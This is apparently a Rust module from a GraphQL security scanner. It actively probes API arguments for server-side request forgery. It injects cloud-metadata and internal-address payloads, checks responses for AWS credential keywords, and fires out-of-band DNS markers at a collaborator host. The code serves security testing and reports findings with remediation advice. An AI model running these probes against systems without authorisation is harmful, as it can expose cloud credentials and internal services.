use colored::Colorize;
use crate::audit::utils::{
    build_operation_query, effective_headers, find_root_field,
};
use crate::config::AppConfig;
use crate::transport::Transport;
use crate::types::{AffectedLocation, Confidence, EvidenceLevel, Finding, FindingStatus, GqlSchema, Severity};
use reqwest::Client;
use std::collections::HashMap;

pub async fn probe_ssrf(
    schema: &GqlSchema,
    url: &str,
    client: &Client,
    extra_headers: &[String],
    rate_limit_ms: u64,
    evasion_level: u8,
    config: &AppConfig,
    passive_findings: &[Finding],
    transport: Transport,
    confirmed: &mut Vec<Finding>,
    unconfirmed: &mut Vec<Finding>,
) -> Result<(), String> {
    let ssrf_finding = passive_findings.iter().find(|f| f.id == "ssrf-surface");
    let Some(ssrf) = ssrf_finding else {
        return Ok(());
    };

    let headers = effective_headers(
        extra_headers,
        Some(config.session.auth_header.as_str()),
        true,
    );
    let mut confirmed_locations: Vec<AffectedLocation> = Vec::new();
    let mut inconclusive_locations: Vec<AffectedLocation> = Vec::new();

    // Out-of-band (collaborator) confirmation: the reliable path for blind SSRF, where timing is
    // inconclusive (a hung outbound looks the same as a slow baseline). A DNS lookup of an
    // attacker-controlled hostname alone confirms SSRF, even if the connect then fails.
    let oob_host = config.audit.oob_url.as_deref().map(oob_host_of).filter(|h| !h.is_empty());
    let mut oob_fired: Vec<(AffectedLocation, String)> = Vec::new();

    for location in &ssrf.affected {
        let (root, field_name, arg_name) = match location {
            AffectedLocation::Argument(r, f, a) => (r, f, a),
            _ => continue,
        };

        let Some(field) = find_root_field(schema, root.as_str(), field_name.as_str()) else {
            continue;
        };
        let op = if root == "Mutation" {
            "mutation"
        } else {
            "query"
        };
        let is_mutation = op == "mutation";

        eprintln!("  {} Testing SSRF Injection on {}.{}({})...", "→".cyan(), root, field_name, arg_name);

        // A fetcher often takes several args (host + port + path + scheme); unless the siblings
        // hold sensible values the resolver never issues a real outbound request (so no timing
        // signal). Seed the common connectivity-sibling args to valid values.
        let mut sibling_overrides: HashMap<String, serde_json::Value> = HashMap::new();
        if let Some(args) = &field.args {
            for a in args {
                if &a.name == arg_name {
                    continue;
                }
                match a.name.to_ascii_lowercase().as_str() {
                    "scheme" | "protocol" => { sibling_overrides.insert(a.name.clone(), serde_json::Value::String("http".to_string())); }
                    "port" => { sibling_overrides.insert(a.name.clone(), serde_json::Value::from(80)); }
                    "path" | "uri_path" | "route" => { sibling_overrides.insert(a.name.clone(), serde_json::Value::String("/".to_string())); }
                    _ => {}
                }
            }
        }

        let mut baseline_overrides = sibling_overrides.clone();
        baseline_overrides.insert(arg_name.clone(), serde_json::Value::String("https://example.com/".to_string()));
        let gql_op_base = build_operation_query(schema, op, field, &baseline_overrides, &config.audit.seeds, false);
        let baseline_resp =
            crate::audit::utils::post_graphql_ext(client, url, &headers, &gql_op_base.query, Some(gql_op_base.variables), rate_limit_ms, evasion_level, transport, is_mutation).await?;
        let baseline_ms = baseline_resp.elapsed_ms;

        let payloads = [
            // Full-URL payloads for args that take a URL/URI.
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:80",
            // Bare host/IP payloads for args that take a HOST (not a full URL) — e.g. a
            // connectivity/import resolver that builds `scheme://<host>:<port>/<path>`. A
            // non-routable address makes the server's outbound fetch hang until timeout,
            // which is the timing signal; a full URL in a host slot would just error fast.
            "169.254.169.254",
            "10.255.255.1",
        ];

        let mut suspicious = false;
        for payload in payloads {
            let mut overrides = sibling_overrides.clone();
            overrides.insert(arg_name.clone(), serde_json::Value::String(payload.to_string()));
            let gql_op = build_operation_query(schema, op, field, &overrides, &config.audit.seeds, false);
            let resp = match crate::audit::utils::post_graphql_ext(client, url, &headers, &gql_op.query, Some(gql_op.variables), rate_limit_ms, evasion_level, transport, is_mutation).await {
                Ok(r) => r,
                Err(e) => {
                    // The baseline succeeded, but THIS payload made our own request time out —
                    // meaning the server's outbound fetch hung on the injected (non-routable /
                    // internal) host. A payload-specific timeout is itself a strong SSRF signal.
                    let el = e.to_lowercase();
                    if el.contains("timed out") || el.contains("timeout") || el.contains("operation was canceled") {
                        suspicious = true;
                        break;
                    }
                    continue; // other transport error → skip this payload
                }
            };

            let delayed = resp.elapsed_ms > baseline_ms + 1500;
            let aws_keywords = ["meta-data", "instance-id", "ami-id", "security-credentials"]
                .iter()
                .any(|k| resp.raw_text.to_lowercase().contains(k));

            if delayed || aws_keywords {
                suspicious = true;
                break;
            }
        }

        // Out-of-band fire: a per-argument DNS marker so a collaborator hit pinpoints the sink.
        if let Some(oobh) = &oob_host {
            let marker = format!("{}.{}", oob_label(field_name, arg_name), oobh);
            // Bare-host form (with seeded scheme/port/path) covers host args; full-URL form covers
            // url args. A DNS lookup fires even if the subsequent connect hangs/fails, so ignore the
            // response entirely.
            for val in [marker.clone(), format!("http://{}/", marker)] {
                let mut ov = sibling_overrides.clone();
                ov.insert(arg_name.clone(), serde_json::Value::String(val));
                let gop = build_operation_query(schema, op, field, &ov, &config.audit.seeds, false);
                let _ = crate::audit::utils::post_graphql_ext(client, url, &headers, &gop.query, Some(gop.variables), rate_limit_ms, evasion_level, transport, is_mutation).await;
            }
            oob_fired.push((location.clone(), marker));
        }

        if suspicious {
            confirmed_locations.push(location.clone());
        } else {
            inconclusive_locations.push(location.clone());
        }
    }

    if !oob_fired.is_empty() {
        let list = oob_fired
            .iter()
            .map(|(loc, m)| format!("- `{}` → marker `{}`", loc, m))
            .collect::<Vec<_>>()
            .join("\n");
        confirmed.push(Finding {
            id: "ssrf-oob",
            severity: Severity::Medium,
            title: "Out-of-Band SSRF Payloads Sent — Verify Collaborator",
            description: format!(
                "### Out-of-band SSRF\n\
                 Fired collaborator payloads carrying a **per-argument DNS marker** at {} SSRF-candidate \
                 argument(s). **Check your collaborator for interactions** — a DNS (or HTTP) hit on a marker \
                 confirms the server made an outbound request from that argument (blind SSRF). A DNS lookup \
                 alone is sufficient proof: the server resolved an attacker-controlled hostname.\n\n\
                 ### Markers fired\n{}",
                oob_fired.len(), list
            ),
            affected: oob_fired.iter().map(|(l, _)| l.clone()).collect(),
            remediation: "Block outbound requests to attacker-controlled destinations; resolve and validate hosts against an allow-list server-side before fetching; deny loopback/link-local/RFC1918.",
            first_step: Some("Open your collaborator/interactsh session and look for DNS/HTTP interactions matching the markers above.".into()),
            references: vec!["OWASP API8: Injection", "CWE-918: Server-Side Request Forgery (SSRF)"],
            status: FindingStatus::Possible,
            confidence: Confidence::Possible,
            evidence_level: EvidenceLevel::Executed,
            poc: None,
        });
    }

    if !confirmed_locations.is_empty() {
        confirmed.push(Finding {
            id: "ssrf",
            severity: Severity::High,
            title: "SSRF Behavior Suspected/Confirmed",
            description: format!(
                "{} operation(s) showed timing/content indicators consistent with SSRF payload handling.",
                confirmed_locations.len()
            ),
            affected: confirmed_locations,
            remediation: "Block internal destinations (loopback, link-local, RFC1918), enforce URL allow-lists, and isolate outbound fetch logic.",
            first_step: Some("Provide a URL to a listener you control (like Burp Collaborator) and check if the server makes an outbound request.".into()),
            references: vec!["OWASP API8: Injection", "CWE-918: Server-Side Request Forgery (SSRF)"],
            status: FindingStatus::Confirmed,
            confidence: Confidence::Confirmed,
            evidence_level: EvidenceLevel::Executed,
            poc: None,
        });
    }

    if !inconclusive_locations.is_empty() {
        unconfirmed.push(Finding {
            id: "ssrf",
            severity: Severity::Medium,
            title: "SSRF Probe Inconclusive",
            description: format!(
                "{} SSRF possibility(s) did not show clear SSRF indicators under default payload probes.",
                inconclusive_locations.len()
            ),
            affected: inconclusive_locations,
            remediation: "Try operation-specific payload shaping and monitor egress logs for outbound callbacks.",
            first_step: Some("Manually test different protocols (like gopher:// or file://) if the server doesn't respond to HTTP payloads.".into()),
            references: vec!["OWASP API8: Injection"],
            status: FindingStatus::Possible,
            confidence: Confidence::Theoretical,
            evidence_level: EvidenceLevel::Inconclusive,
            poc: None,
        });
    }

    Ok(())
}

/// Extract the bare host from a collaborator URL/domain (strips scheme, userinfo, path, port).
fn oob_host_of(u: &str) -> String {
    let s = u.trim();
    let s = s.rsplit("://").next().unwrap_or(s); // strip scheme://
    let s = s.split('/').next().unwrap_or(s); // strip /path
    let s = s.rsplit('@').next().unwrap_or(s); // strip userinfo@
    let s = s.split(':').next().unwrap_or(s); // strip :port
    s.trim().trim_matches('.').to_lowercase()
}

/// A DNS-safe per-target subdomain label (`<field>-<arg>`, alphanumeric+hyphen, <=40 chars) so a
/// collaborator hit identifies exactly which argument reached out.
fn oob_label(field: &str, arg: &str) -> String {
    let mut s: String = format!("{}-{}", field, arg)
        .chars()
        .map(|c| if c.is_ascii_alphanumeric() { c.to_ascii_lowercase() } else { '-' })
        .collect();
    while s.contains("--") {
        s = s.replace("--", "-");
    }
    let s = s.trim_matches('-');
    let mut out = s.to_string();
    out.truncate(40);
    out.trim_matches('-').to_string()
}
